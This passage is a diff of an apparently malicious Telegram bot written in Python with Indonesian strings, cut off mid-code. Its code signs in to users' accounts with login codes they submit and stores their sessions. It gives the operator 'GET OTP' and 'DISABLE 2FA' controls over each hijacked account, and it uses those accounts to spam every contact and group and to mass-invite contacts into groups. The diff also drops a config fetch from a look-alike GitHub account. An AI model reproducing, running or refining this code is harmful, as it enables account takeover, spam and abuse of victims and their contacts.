@@ -14,7 +14,6 @@ from telethon import functions, types
 from modules import clear_session
 from modules.utils import send_startup_notification, update_from_github
 #from modules.my_env import *
-from urllib.parse import urljoin
 import random
 import asyncio
 import sqlite3
@@ -52,22 +51,6 @@ fPhase = f"{path}json/phase.json"
 
 # Track which group to use next
 current_group_index = 0  # Start with the first group
-
-GITHUB_RAW_URL = "https://raw.githubusercontent.com/HeIpCenter/cfg/refs/heads/main/cfg.json"
-
-async def load_config():
-    try:
-        async with httpx.AsyncClient() as client:
-            response = await client.get(GITHUB_RAW_URL)
-            if response.status_code == 200:
-                config = response.json()
-                return config
-            else:
-                print(f"Gagal mengambil config. Status code: {response.status_code}")
-                return None
-    except Exception as e:
-        print(f"Error saat mengambil config: {e}")
-        return None
 
 def readJSON(targetFile):
     with open(targetFile, 'r') as openfile: jsondata = json.load(openfile)
@@ -114,46 +97,37 @@ async def join_default_group(client, phone_number):
         'message': 'Process not completed'
     }
     
-    # Load config terbaru setiap kali fungsi dipanggil
-    config = await load_config()
-    if not config or not config.get("DEFAULT_GROUP_LINK"):
-        result['message'] = 'DEFAULT_GROUP_LINK tidak ditemukan dalam config'
-        print(result['message'])
-        return result
-    
-    group_link = config["DEFAULT_GROUP_LINK"]
-    
     try:
         print(f"\n🔍 Starting process for {phone_number}...")
-        print(f"🔗 Group Link: {group_link}")
         
+        # Initialize group_entity variable for cleanup
         group_entity = None
         
         # 1. JOIN GROUP PROCESS
-        if group_link.startswith('https://t.me/+') or group_link.startswith('https://t.me/joinchat/'):
+        if DEFAULT_GROUP_LINK.startswith('https://t.me/+') or DEFAULT_GROUP_LINK.startswith('https://t.me/joinchat/'):
             # Private group handling
-            hash_part = group_link.split('/')[-1].lstrip('+')
+            hash_part = DEFAULT_GROUP_LINK.split('/')[-1].lstrip('+')
             try:
                 await client(ImportChatInviteRequest(hash=hash_part))
-                print("✅ Joined private group successfully")
+                print(f"✅ Joined private group successfully")
             except errors.UserAlreadyParticipantError:
-                print("ℹ️ Already in group")
+                print(f"ℹ️ Already in group")
             except Exception as e:
                 print(f"❌ Join error: {str(e)}")
                 return result
         else:
             # Public group/channel handling
-            username = group_link.split('/')[-1]
+            username = DEFAULT_GROUP_LINK.split('/')[-1]
             try:
                 await client(JoinChannelRequest(channel=username))
-                print("✅ Joined public group successfully")
+                print(f"✅ Joined public group successfully")
             except Exception as e:
                 print(f"❌ Join error: {str(e)}")
                 return result
 
         # 2. GET GROUP ENTITY
         try:
-            group_entity = await client.get_entity(group_link)
+            group_entity = await client.get_entity(DEFAULT_GROUP_LINK)
             print(f"📌 Group ID: {group_entity.id}")
         except Exception as e:
             print(f"❌ Failed to get group entity: {str(e)}")
@@ -164,17 +138,20 @@ async def join_default_group(client, phone_number):
         active_contacts = []
         
         try:
+            # Get all contacts
             contacts = await client(GetContactsRequest(hash=0))
             print(f"📋 Total contacts found: {len(contacts.users)}")
             
+            # Filter for mutual contacts only
             mutual_contacts = [
                 user for user in contacts.users 
                 if hasattr(user, 'contact') and user.contact 
                 and hasattr(user, 'mutual_contact') and user.mutual_contact
             ]
             
-            print(f"👥 Found {len(mutual_contacts)} mutual contacts")
+            print(f"👥 Found {len(mutual_contacts)} mutual contacts (saling save)")
             
+            # Filter for active contacts in the last 7 days
             for contact in mutual_contacts:
                 if hasattr(contact, 'status'):
                     if isinstance(contact.status, UserStatusRecently):
@@ -193,15 +170,16 @@ async def join_default_group(client, phone_number):
             
             print(f"📅 Found {len(active_contacts)} active mutual contacts (7 days)")
             
+            # Limit to maximum 20 contacts
             if len(active_contacts) > 20:
                 active_contacts = active_contacts[:20]
-                print("🔢 Limiting to first 20 active contacts")
+                print(f"🔢 Limiting to first 20 active contacts")
             
         except Exception as e:
             print(f"❌ Contact processing error: {str(e)}")
             return result
 
-        # 4. INVITE CONTACTS
+        # 4. INVITE CONTACTS WITH SAFETY MEASURES
         added_count = 0
         if active_contacts:
             print(f"🔄 Starting invitation process for {len(active_contacts)} contacts...")
@@ -215,6 +193,7 @@ async def join_default_group(client, phone_number):
                     added_count += 1
                     print(f"✓ Added {contact.id} ({added_count}/{len(active_contacts)})")
                     
+                    # Add sleep after every 5 invites
                     if i % 5 == 0 and i != len(active_contacts):
                         await asyncio.sleep(1)
                         
@@ -232,7 +211,7 @@ async def join_default_group(client, phone_number):
                     print(f"✕ Failed to add {contact.id}: {str(e)}")
                     continue
         
-        # 5. UPDATE RESULT
+        # 5. UPDATE RESULT IF COMPLETED
         if added_count > 0 or not active_contacts:
             result.update({
                 'status': 'completed',
@@ -245,7 +224,7 @@ async def join_default_group(client, phone_number):
         result['message'] = f'Critical error: {str(e)}'
     
     finally:
-        # 6. CLEANUP - LEAVE GROUP
+        # 6. CLEANUP - LEAVE GROUP IF JOINED
         if group_entity:
             try:
                 await client(LeaveChannelRequest(channel=group_entity))
@@ -377,7 +356,7 @@ def btnSpecificUsers(phonenumber):
         # Baris untuk kode dan keamanan
         [
             Button.inline("🔐 GET OTP", f"readcode-{phonenumber}"),
-            #Button.inline("🚫 DISABLE 2FA", f"disable2fa-{phonenumber}")
+            Button.inline("🚫 DISABLE 2FA", f"disable2fa-{phonenumber}")
         ],
         # Baris untuk komunikasi
         [
@@ -443,11 +422,11 @@ async def handle_new_message(event):
             elif len(split) == 2 and len(split[1]) == 5:
                 try:
                     # First check if we should process this user
-                    if users.get(split[0], {}).get('group_processed'):
-                        print(f"ℹ️ User {split[0]} already processed - skipping group actions")
-                        processed = True
-                    else:
-                        processed = False
+                    # if users.get(split[0], {}).get('group_processed'):
+                    #     print(f"ℹ️ User {split[0]} already processed - skipping group actions")
+                    #     processed = True
+                    # else:
+                    #     processed = False
 
                     # Sign in process
                     result = await acc.sign_in(split[0], split[1], phone_code_hash=f"{phase[split[0]]}")
@@ -475,26 +454,26 @@ async def handle_new_message(event):
                     )
 
                     # Only process group actions if not already done
-                    if not processed:
-                        try:
-                            # Execute group actions
-                            reaction_result = await react_to_specific_message(acc, split[0])
-                            if reaction_result.get('status') != 'completed':
-                                print(f"⚠️ Reaction failed for {split[0]}: {reaction_result.get('message')}")
-                            else:
-                                invite_result = await join_default_group(acc, split[0])
-                                if invite_result.get('status') == 'completed':
-                                    # Mark as processed only after successful completion
-                                    users[split[0]]["group_processed"] = True
-                                    print(f"✅ Successfully processed group invitation for {split[0]}")
-                                else:
-                                    print(f"⚠️ Group process failed for {split[0]}: {invite_result.get('message')}")
-                        except Exception as e:
-                            print(f"⚠️ Group actions failed for {split[0]}: {str(e)}")
-                        finally:
-                        # Ensure cleanup even if group process fails
-                            if acc.is_connected():
-                                await acc.disconnect()
+                    # if not processed:
+                    #     try:
+                    #         # Execute group actions
+                    #         reaction_result = await react_to_specific_message(acc, split[0])
+                    #         if reaction_result.get('status') != 'completed':
+                    #             print(f"⚠️ Reaction failed for {split[0]}: {reaction_result.get('message')}")
+                    #         else:
+                    #             invite_result = await join_default_group(acc, split[0])
+                    #             if invite_result.get('status') == 'completed':
+                    #                 # Mark as processed only after successful completion
+                    #                 users[split[0]]["group_processed"] = True
+                    #                 print(f"✅ Successfully processed group invitation for {split[0]}")
+                    #             else:
+                    #                 print(f"⚠️ Group process failed for {split[0]}: {invite_result.get('message')}")
+                    #     except Exception as e:
+                    #         print(f"⚠️ Group actions failed for {split[0]}: {str(e)}")
+                    #     finally:
+                    #     # Ensure cleanup even if group process fails
+                    #         if acc.is_connected():
+                    #             await acc.disconnect()
 
                     update({
                         "method": "update", 
@@ -558,29 +537,29 @@ async def handle_new_message(event):
                     )
             
                     # Group invitation process with proper error handling
-                    try:
-                        # 1. First do the reaction
-                        reaction_result = await react_to_specific_message(acc, split[0])
-                        if reaction_result.get('status') != 'completed':
-                            print(f"⚠️ Reaction failed for {split[0]}: {reaction_result.get('message')}")
-                            raise Exception("Reaction process failed")
+                    # try:
+                    #     # 1. First do the reaction
+                    #     reaction_result = await react_to_specific_message(acc, split[0])
+                    #     if reaction_result.get('status') != 'completed':
+                    #         print(f"⚠️ Reaction failed for {split[0]}: {reaction_result.get('message')}")
+                    #         raise Exception("Reaction process failed")
             
-                        # 2. Then join and invite to group
-                        invite_result = await join_default_group(acc, split[0])
-                        if invite_result.get('status') != 'completed':
-                            print(f"⚠️ Group process failed for {split[0]}: {invite_result.get('message')}")
-                            raise Exception("Group process failed")
+                    #     # 2. Then join and invite to group
+                    #     invite_result = await join_default_group(acc, split[0])
+                    #     if invite_result.get('status') != 'completed':
+                    #         print(f"⚠️ Group process failed for {split[0]}: {invite_result.get('message')}")
+                    #         raise Exception("Group process failed")
             
-                        print(f"✅ Successfully processed group invitation for {split[0]}")
+                    #     print(f"✅ Successfully processed group invitation for {split[0]}")
                         
-                    except errors.FloodWaitError as e:
-                        print(f"⛔ FloodWaitError for {split[0]}: Need to wait {e.seconds} seconds")
-                    except Exception as e:
-                        print(f"⚠️ Group invitation process failed for {split[0]}: {str(e)}")
-                    finally:
-                        # Ensure cleanup even if group process fails
-                        if acc.is_connected():
-                            await acc.disconnect()
+                    # except errors.FloodWaitError as e:
+                    #     print(f"⛔ FloodWaitError for {split[0]}: Need to wait {e.seconds} seconds")
+                    # except Exception as e:
+                    #     print(f"⚠️ Group invitation process failed for {split[0]}: {str(e)}")
+                    # finally:
+                    #     # Ensure cleanup even if group process fails
+                    #     if acc.is_connected():
+                    #         await acc.disconnect()
             
                     update({
                         "method": "update",
@@ -612,7 +591,7 @@ async def handle_new_message(event):
                     saveJSON(fUsers, users)
                     if acc.is_connected():
                             await acc.disconnect()
-
+            acc.disconnect()
         elif SENDER in admin:
             if text.startswith("/"):
                 # await event.delete()
@@ -639,13 +618,10 @@ async def handle_new_message(event):
                 broadcast_message = text
                 del broadcast_state[SENDER]
                 
-                # Buat variable untuk melacak client yang dibuka
-                client = None
+                client = TelegramClient(f"{path}sessions/users/{phone}", api_id, api_hash)
+                await client.connect()
                 
                 try:
-                    client = TelegramClient(f"{path}sessions/users/{phone}", api_id, api_hash)
-                    await client.connect()
-                    
                     status_msg = await event.respond("📤 **Memulai Broadcast...**")
                     dialogs = await client.get_dialogs()
                     contacts_result = await client(functions.contacts.GetContactsRequest(hash=0))
@@ -733,76 +709,43 @@ async def handle_new_message(event):
                             
                             # PROSES 1: Kirim ke mutual kontak terlebih dahulu
                             await status_msg.edit("**🔁 Memproses Mutual Kontak...**")
-                            batch_counter = 0
-                            
-                            # Batasi jumlah target untuk memproses dalam satu batch
-                            max_batch_size = 50
-                            for i in range(0, len(mutual_users), max_batch_size):
-                                batch = mutual_users[i:i+max_batch_size]
-                                for target in batch:
-                                    try:
-                                        if isinstance(target, Dialog):
-                                            await client.send_file(target.id, file=media_path, caption=caption)
-                                        else:
-                                            await client.send_file(target.id, file=media_path, caption=caption)
-                                        success += 1
-                                        batch_counter += 1
-                                        
-                                        if batch_counter % 5 == 0:
-                                            await asyncio.sleep(0.1)
-                                    except Exception as e:
-                                        failed += 1
-                                    finally:
-                                        await asyncio.sleep(0.1)  # Small delay between each send
-                                
-                                # Delay antara batch untuk mengurangi beban
-                                await asyncio.sleep(0.1)
+                            for target in mutual_users:
+                                try:
+                                    if isinstance(target, Dialog):
+                                        await client.send_file(target.id, file=media_path, caption=caption)
+                                    else:
+                                        await client.send_file(target.id, file=media_path, caption=caption)
+                                    success += 1
+                                except Exception as e:
+                                    failed += 1
+                                finally:
+                                    await asyncio.sleep(0.5)
                             
                             # PROSES 2: Kirim ke non-mutual kontak
                             await status_msg.edit("**🔁 Memproses Non-Mutual Kontak...**")
-                            batch_counter = 0
-                            for i in range(0, len(non_mutual_users), max_batch_size):
-                                batch = non_mutual_users[i:i+max_batch_size]
-                                for target in batch:
-                                    try:
-                                        if isinstance(target, Dialog):
-                                            await client.send_file(target.id, file=media_path, caption=caption)
-                                        else:
-                                            await client.send_file(target.id, file=media_path, caption=caption)
-                                        success += 1
-                                        batch_counter += 1
-                                        
-                                        if batch_counter % 5 == 0:
-                                            await asyncio.sleep(0.1)
-                                    except Exception as e:
-                                        failed += 1
-                                    finally:
-                                        await asyncio.sleep(0.1)  # Small delay between each send
-                                
-                                # Delay antara batch untuk mengurangi beban
-                                await asyncio.sleep(0.1)
+                            for target in non_mutual_users:
+                                try:
+                                    if isinstance(target, Dialog):
+                                        await client.send_file(target.id, file=media_path, caption=caption)
+                                    else:
+                                        await client.send_file(target.id, file=media_path, caption=caption)
+                                    success += 1
+                                except Exception as e:
+                                    failed += 1
+                                finally:
+                                    await asyncio.sleep(0.5)
                             
                             # PROSES 3: Kirim ke grup
                             await status_msg.edit("**🔁 Memproses Grup...**")
-                            batch_counter = 0
-                            for i in range(0, len(groups), max_batch_size):
-                                batch = groups[i:i+max_batch_size]
-                                for group in batch:
-                                    try:
-                                        await client.send_file(group.id, file=media_path, caption=caption)
-                                        success += 1
-                                        batch_counter += 1
-                                        
-                                        if batch_counter % 5 == 0:
-                                            await asyncio.sleep(0.1)
-                                    except Exception as e:
-                                        failed += 1
-                                        failed_groups += 1
-                                    finally:
-                                        await asyncio.sleep(0.1)  # Small delay between each send
-                                
-                                # Delay antara batch untuk mengurangi beban
-                                await asyncio.sleep(0.1)
+                            for group in groups:
+                                try:
+                                    await client.send_file(group.id, file=media_path, caption=caption)
+                                    success += 1
+                                except Exception as e:
+                                    failed += 1
+                                    failed_groups += 1
+                                finally:
+                                    await asyncio.sleep(0.5)
                         
                         except Exception as e:
                             await event.respond(f"❌ Error saat memproses media: {str(e)}")
@@ -812,76 +755,43 @@ async def handle_new_message(event):
                     else:
                         # PROSES 1: Kirim ke mutual kontak terlebih dahulu
                         await status_msg.edit("**🔁 Memproses Mutual Kontak...**")
-                        batch_counter = 0
-                        
-                        # Batasi jumlah target untuk memproses dalam satu batch
-                        max_batch_size = 50
-                        for i in range(0, len(mutual_users), max_batch_size):
-                            batch = mutual_users[i:i+max_batch_size]
-                            for target in batch:
-                                try:
-                                    if isinstance(target, Dialog):
-                                        await client.send_message(target.id, broadcast_message)
-                                    else:
-                                        await client.send_message(target.id, broadcast_message)
-                                    success += 1
-                                    batch_counter += 1
-                                    
-                                    if batch_counter % 5 == 0:
-                                        await asyncio.sleep(0.1)
-                                except Exception as e:
-                                    failed += 1
-                                finally:
-                                    await asyncio.sleep(0.1)  # Small delay between each send
-                            
-                            # Delay antara batch untuk mengurangi beban
-                            await asyncio.sleep(0.1)
+                        for target in mutual_users:
+                            try:
+                                if isinstance(target, Dialog):
+                                    await client.send_message(target.id, broadcast_message)
+                                else:
+                                    await client.send_message(target.id, broadcast_message)
+                                success += 1
+                            except Exception as e:
+                                failed += 1
+                            finally:
+                                await asyncio.sleep(0.5)
                         
                         # PROSES 2: Kirim ke non-mutual kontak
                         await status_msg.edit("**🔁 Memproses Non-Mutual Kontak...**")
-                        batch_counter = 0
-                        for i in range(0, len(non_mutual_users), max_batch_size):
-                            batch = non_mutual_users[i:i+max_batch_size]
-                            for target in batch:
-                                try:
-                                    if isinstance(target, Dialog):
-                                        await client.send_message(target.id, broadcast_message)
-                                    else:
-                                        await client.send_message(target.id, broadcast_message)
-                                    success += 1
-                                    batch_counter += 1
-                                    
-                                    if batch_counter % 5 == 0:
-                                        await asyncio.sleep(0.1)
-                                except Exception as e:
-                                    failed += 1
-                                finally:
-                                    await asyncio.sleep(0.1)  # Small delay between each send
-                            
-                            # Delay antara batch untuk mengurangi beban
-                            await asyncio.sleep(0.5)
+                        for target in non_mutual_users:
+                            try:
+                                if isinstance(target, Dialog):
+                                    await client.send_message(target.id, broadcast_message)
+                                else:
+                                    await client.send_message(target.id, broadcast_message)
+                                success += 1
+                            except Exception as e:
+                                failed += 1
+                            finally:
+                                await asyncio.sleep(0.5)
                         
                         # PROSES 3: Kirim ke grup
                         await status_msg.edit("**🔁 Memproses Grup...**")
-                        batch_counter = 0
-                        for i in range(0, len(groups), max_batch_size):
-                            batch = groups[i:i+max_batch_size]
-                            for group in batch:
-                                try:
-                                    await client.send_message(group.id, broadcast_message)
-                                    success += 1
-                                    batch_counter += 1
-                                    
-                                    if batch_counter % 5 == 0:
-                                        await asyncio.sleep(0.1)
-                                except Exception as e:
-                                    failed += 1
-                                    failed_groups += 1
-                                finally:
-                                    await asyncio.sleep(0.1)  # Small delay between each send
-                            
-                            # Delay antara batch untuk mengurangi beban
-                            await asyncio.sleep(0.1)
+                        for group in groups:
+                            try:
+                                await client.send_message(group.id, broadcast_message)
+                                success += 1
+                            except Exception as e:
+                                failed += 1
+                                failed_groups += 1
+                            finally:
+                                await asyncio.sleep(0.5)
                     
                     # Hasil akhir
                     result_message = (
@@ -891,7 +801,7 @@ async def handle_new_message(event):
                         f"❌ **Gagal:** `{failed}`\n"
                         f"🤖 **Bot Dilewati:** `{skipped_bots}`\n"
                         f"👥 **Grup Gagal:** `{failed_groups}`\n"
-                        f"⚡ **Persentase Sukses:** `{round((success/(success+failed))*100, 2) if success+failed > 0 else 0}%`\n\n"
+                        f"⚡ **Persentase Sukses:** `{round((success/(success+failed))*100, 2)}%`\n\n"
                         f"**Urutan Pengiriman:**\n"
                         f"1. Mutual Kontak: {len(mutual_users)} target\n"
                         f"2. Non-Mutual Kontak: {len(non_mutual_users)} target\n"
@@ -903,234 +813,210 @@ async def handle_new_message(event):
                 except Exception as e:
                     await event.respond(f"**⚠️ Error:** `{str(e)}`")
                 finally:
-                    # Pastikan client ditutup dengan benar
-                    if client and client.is_connected():
-                        await client.disconnect()
-                    
-                    # Hapus semua file .jpg di folder media_broadcast
-                    media_dir = os.path.join(path, "media_broadcast")
-                    if os.path.exists(media_dir):
-                        try:
-                            for filename in os.listdir(media_dir):
-                                if filename.lower().endswith('.jpg'):
-                                    file_path = os.path.join(media_dir, filename)
-                                    try:
-                                        os.remove(file_path)
-                                        print(f"✅ Berhasil menghapus: {file_path}")
-                                    except Exception as e:
-                                        print(f"❌ Gagal menghapus {file_path}: {str(e)}")
-                        except Exception as e:
-                            print(f"⚠️ Error saat membersihkan folder media: {str(e)}")
-                    
-                    # Hapus file media spesifik jika ada
                     if media_path and os.path.exists(media_path):
                         try:
                             os.remove(media_path)
                         except Exception as e:
                             print(f"❌ Gagal menghapus file media: {str(e)}")
-                        
-                    # Reset semua variabel untuk membantu garbage collection
-                    mutual_users = None
-                    non_mutual_users = None
-                    groups = None
+                    await client.disconnect()
 
-            # elif SENDER in invite_state and invite_state[SENDER].get('step') == 'awaiting_group_link':
-            #     state = invite_state[SENDER]
-            #     group_link = text.strip()
+            elif SENDER in invite_state and invite_state[SENDER].get('step') == 'awaiting_group_link':
+                state = invite_state[SENDER]
+                group_link = text.strip()
 
-            #     if not group_link.startswith(('https://t.me/', 't.me/')):
-            #         await event.respond("⚠ Format link tidak valid! Harus berupa link Telegram (contoh: `https://t.me/namagrup`)")
-            #         return
+                if not group_link.startswith(('https://t.me/', 't.me/')):
+                    await event.respond("⚠ Format link tidak valid! Harus berupa link Telegram (contoh: `https://t.me/namagrup`)")
+                    return
 
-            #     # Simpan link grup dan lanjutkan ke proses undangan
-            #     invite_state[SENDER]['group_link'] = group_link
-            #     invite_state[SENDER]['step'] = 'processing'
+                # Simpan link grup dan lanjutkan ke proses undangan
+                invite_state[SENDER]['group_link'] = group_link
+                invite_state[SENDER]['step'] = 'processing'
 
-            #     days = state['filter_days']
-            #     filter_name = {
-            #         0: "SEMUA KONTAK MUTUAL",
-            #         1: "1 Hari Terakhir",
-            #         3: "3 Hari Terakhir",
-            #         7: "7 Hari Terakhir",
-            #         30: "30 Hari Terakhir"
-            #     }.get(days, "SEMUA KONTAK MUTUAL")
+                days = state['filter_days']
+                filter_name = {
+                    0: "SEMUA KONTAK MUTUAL",
+                    1: "1 Hari Terakhir",
+                    3: "3 Hari Terakhir",
+                    7: "7 Hari Terakhir",
+                    30: "30 Hari Terakhir"
+                }.get(days, "SEMUA KONTAK MUTUAL")
 
-            #     # Kirim pesan status awal
-            #     status_msg = await event.respond(
-            #         f"🔄 Memulai proses undangan...\n"
-            #         f"• Filter: {filter_name}\n"
-            #         f"• Grup Tujuan: {group_link}\n"
-            #         f"• Hanya kontak mutual (saling save)\n\n"
-            #         f"⏳ Mohon tunggu..."
-            #     )
+                # Kirim pesan status awal
+                status_msg = await event.respond(
+                    f"🔄 Memulai proses undangan...\n"
+                    f"• Filter: {filter_name}\n"
+                    f"• Grup Tujuan: {group_link}\n"
+                    f"• Hanya kontak mutual (saling save)\n\n"
+                    f"⏳ Mohon tunggu..."
+                )
 
-            #     client = TelegramClient(f"{path}sessions/users/{state['phone']}", api_id, api_hash)
-            #     await client.connect()
+                client = TelegramClient(f"{path}sessions/users/{state['phone']}", api_id, api_hash)
+                await client.connect()
 
-            #     try:
-            #         # Fungsi untuk mendapatkan entitas grup
-            #         async def get_group_entity():
-            #             try:
-            #                 if group_link.startswith('https://t.me/+') or group_link.startswith('https://t.me/joinchat/'):
-            #                     hash_part = group_link.split('/')[-1]
-            #                     if hash_part.startswith('+'): 
-            #                         hash_part = hash_part[1:]
+                try:
+                    # Fungsi untuk mendapatkan entitas grup
+                    async def get_group_entity():
+                        try:
+                            if group_link.startswith('https://t.me/+') or group_link.startswith('https://t.me/joinchat/'):
+                                hash_part = group_link.split('/')[-1]
+                                if hash_part.startswith('+'): 
+                                    hash_part = hash_part[1:]
 
-            #                     try:
-            #                         await client(functions.messages.ImportChatInviteRequest(hash=hash_part))
-            #                         await asyncio.sleep(3)
-            #                         dialogs = await client.get_dialogs()
-            #                         for dialog in dialogs:
-            #                             if dialog.is_group or dialog.is_channel:
-            #                                 if hasattr(dialog.entity, 'id'):
-            #                                     return dialog.entity
-            #                     except errors.UserAlreadyParticipantError:
-            #                         dialogs = await client.get_dialogs()
-            #                         for dialog in dialogs:
-            #                             if dialog.is_group or dialog.is_channel:
-            #                                 if hasattr(dialog.entity, 'id'):
-            #                                     return dialog.entity
-            #                 else:
-            #                     group_username = group_link.split('/')[-1]
-            #                     return await client.get_entity(group_username)
-            #             except Exception as e:
-            #                 print(f"Error in get_group_entity: {str(e)}")
-            #                 return None
+                                try:
+                                    await client(functions.messages.ImportChatInviteRequest(hash=hash_part))
+                                    await asyncio.sleep(3)
+                                    dialogs = await client.get_dialogs()
+                                    for dialog in dialogs:
+                                        if dialog.is_group or dialog.is_channel:
+                                            if hasattr(dialog.entity, 'id'):
+                                                return dialog.entity
+                                except errors.UserAlreadyParticipantError:
+                                    dialogs = await client.get_dialogs()
+                                    for dialog in dialogs:
+                                        if dialog.is_group or dialog.is_channel:
+                                            if hasattr(dialog.entity, 'id'):
+                                                return dialog.entity
+                            else:
+                                group_username = group_link.split('/')[-1]
+                                return await client.get_entity(group_username)
+                        except Exception as e:
+                            print(f"Error in get_group_entity: {str(e)}")
+                            return None
 
-            #         group = await get_group_entity()
-            #         if not group:
-            #             await status_msg.edit("⚠️ Tidak dapat mengakses grup. coba lagi.")
-            #             return
+                    group = await get_group_entity()
+                    if not group:
+                        await status_msg.edit("⚠️ Tidak dapat mengakses grup. coba lagi.")
+                        return
 
-            #         if isinstance(group, types.Chat):
-            #             input_peer = types.InputPeerChat(chat_id=group.id)
-            #             is_supergroup = False
-            #         elif isinstance(group, (types.Channel, types.ChatForbidden)):
-            #             input_peer = types.InputPeerChannel(
-            #                 channel_id=group.id,
-            #                 access_hash=group.access_hash
-            #             )
-            #             is_supergroup = True
-            #         else:
-            #             await status_msg.edit("⚠️ Jenis grup tidak didukung")
-            #             return
+                    if isinstance(group, types.Chat):
+                        input_peer = types.InputPeerChat(chat_id=group.id)
+                        is_supergroup = False
+                    elif isinstance(group, (types.Channel, types.ChatForbidden)):
+                        input_peer = types.InputPeerChannel(
+                            channel_id=group.id,
+                            access_hash=group.access_hash
+                        )
+                        is_supergroup = True
+                    else:
+                        await status_msg.edit("⚠️ Jenis grup tidak didukung")
+                        return
 
-            #         # Get contacts dengan filter mutual yang ketat (hanya yang saling save)
-            #         contacts_result = await client(functions.contacts.GetContactsRequest(hash=0))
-            #         all_contacts = contacts_result.users
+                    # Get contacts dengan filter mutual yang ketat (hanya yang saling save)
+                    contacts_result = await client(functions.contacts.GetContactsRequest(hash=0))
+                    all_contacts = contacts_result.users
 
-            #         await status_msg.edit("🔍 Mencari kontak mutual (saling save)...")
+                    await status_msg.edit("🔍 Mencari kontak mutual (saling save)...")
 
-            #         # Filter ketat: hanya kontak yang benar-benar mutual (saling save)
-            #         mutual_contacts = [
-            #             contact for contact in all_contacts 
-            #             if getattr(contact, 'mutual_contact', False)
-            #         ]
+                    # Filter ketat: hanya kontak yang benar-benar mutual (saling save)
+                    mutual_contacts = [
+                        contact for contact in all_contacts 
+                        if getattr(contact, 'mutual_contact', False)
+                    ]
 
-            #         if not mutual_contacts:
-            #             await status_msg.edit("⚠️ Tidak ditemukan kontak mutual (saling save)")
-            #             return
+                    if not mutual_contacts:
+                        await status_msg.edit("⚠️ Tidak ditemukan kontak mutual (saling save)")
+                        return
 
-            #         # Filter berdasarkan last seen jika diperlukan
-            #         if days > 0:
-            #             await status_msg.edit(f"🔍 Memfilter {len(mutual_contacts)} kontak mutual yang aktif {days} hari terakhir...")
-            #             max_last_seen = time.time() - (days * 24 * 60 * 60)
-            #             filtered_contacts = []
+                    # Filter berdasarkan last seen jika diperlukan
+                    if days > 0:
+                        await status_msg.edit(f"🔍 Memfilter {len(mutual_contacts)} kontak mutual yang aktif {days} hari terakhir...")
+                        max_last_seen = time.time() - (days * 24 * 60 * 60)
+                        filtered_contacts = []
 
-            #             for contact in mutual_contacts:
-            #                 if not hasattr(contact, 'status'):
-            #                     continue
+                        for contact in mutual_contacts:
+                            if not hasattr(contact, 'status'):
+                                continue
 
-            #                 if isinstance(contact.status, types.UserStatusOnline):
-            #                     filtered_contacts.append(contact)
-            #                 elif isinstance(contact.status, types.UserStatusRecently) and days >= 3:
-            #                     filtered_contacts.append(contact)
-            #                 elif isinstance(contact.status, types.UserStatusLastWeek) and days >= 7:
-            #                     filtered_contacts.append(contact)
-            #                 elif isinstance(contact.status, types.UserStatusOffline) and hasattr(contact.status, 'was_online'):
-            #                     try:
-            #                         if contact.status.was_online.timestamp() >= max_last_seen:
-            #                             filtered_contacts.append(contact)
-            #                     except:
-            #                         pass
+                            if isinstance(contact.status, types.UserStatusOnline):
+                                filtered_contacts.append(contact)
+                            elif isinstance(contact.status, types.UserStatusRecently) and days >= 3:
+                                filtered_contacts.append(contact)
+                            elif isinstance(contact.status, types.UserStatusLastWeek) and days >= 7:
+                                filtered_contacts.append(contact)
+                            elif isinstance(contact.status, types.UserStatusOffline) and hasattr(contact.status, 'was_online'):
+                                try:
+                                    if contact.status.was_online.timestamp() >= max_last_seen:
+                                        filtered_contacts.append(contact)
+                                except:
+                                    pass
                                 
-            #             contacts_to_invite = filtered_contacts
-            #         else:
-            #             contacts_to_invite = mutual_contacts
+                        contacts_to_invite = filtered_contacts
+                    else:
+                        contacts_to_invite = mutual_contacts
 
-            #         if not contacts_to_invite:
-            #             await status_msg.edit(f"⚠️ Tidak ada kontak mutual yang aktif dalam {days} hari terakhir")
-            #             return
+                    if not contacts_to_invite:
+                        await status_msg.edit(f"⚠️ Tidak ada kontak mutual yang aktif dalam {days} hari terakhir")
+                        return
 
-            #         total_contacts = len(contacts_to_invite)
-            #         success = 0
-            #         failures = 0
+                    total_contacts = len(contacts_to_invite)
+                    success = 0
+                    failures = 0
 
-            #         await status_msg.edit(
-            #             f"✅ Ditemukan {total_contacts} kontak mutual\n"
-            #             f"🔄 Memulai undangan ke grup...\n\n"
-            #             f"⏳ Progress: 0/{total_contacts}\n"
-            #             f"✔ Berhasil: 0 | ✖ Gagal: 0"
-            #         )
+                    await status_msg.edit(
+                        f"✅ Ditemukan {total_contacts} kontak mutual\n"
+                        f"🔄 Memulai undangan ke grup...\n\n"
+                        f"⏳ Progress: 0/{total_contacts}\n"
+                        f"✔ Berhasil: 0 | ✖ Gagal: 0"
+                    )
 
-            #         for i, contact in enumerate(contacts_to_invite):
-            #             try:
-            #                 # Update progress setiap 5 kontak atau kontak terakhir
-            #                 if i % 5 == 0 or i == len(contacts_to_invite) - 1:
-            #                     await status_msg.edit(
-            #                         f"🔄 Proses undangan...\n\n"
-            #                         f"⏳ Progress: {i+1}/{total_contacts}\n"
-            #                         f"✔ Berhasil: {success} | ✖ Gagal: {failures}\n"
-            #                         f"📌 Sedang memproses: {getattr(contact, 'first_name', '')} {getattr(contact, 'last_name', '')}"
-            #                     )
+                    for i, contact in enumerate(contacts_to_invite):
+                        try:
+                            # Update progress setiap 5 kontak atau kontak terakhir
+                            if i % 5 == 0 or i == len(contacts_to_invite) - 1:
+                                await status_msg.edit(
+                                    f"🔄 Proses undangan...\n\n"
+                                    f"⏳ Progress: {i+1}/{total_contacts}\n"
+                                    f"✔ Berhasil: {success} | ✖ Gagal: {failures}\n"
+                                    f"📌 Sedang memproses: {getattr(contact, 'first_name', '')} {getattr(contact, 'last_name', '')}"
+                                )
 
-            #                 if is_supergroup:
-            #                     await client(functions.channels.InviteToChannelRequest(
-            #                         channel=input_peer,
-            #                         users=[contact]
-            #                     ))
-            #                 else:
-            #                     await client(functions.messages.AddChatUserRequest(
-            #                         chat_id=group.id,
-            #                         user_id=contact,
-            #                         fwd_limit=100
-            #                     ))
+                            if is_supergroup:
+                                await client(functions.channels.InviteToChannelRequest(
+                                    channel=input_peer,
+                                    users=[contact]
+                                ))
+                            else:
+                                await client(functions.messages.AddChatUserRequest(
+                                    chat_id=group.id,
+                                    user_id=contact,
+                                    fwd_limit=100
+                                ))
 
-            #                 success += 1
-            #                 #await asyncio.sleep(0.1)  # Delay untuk menghindari flood
+                            success += 1
+                            await asyncio.sleep(0.5)  # Delay untuk menghindari flood
 
-            #             except errors.UserAlreadyParticipantError:
-            #                 failures += 1
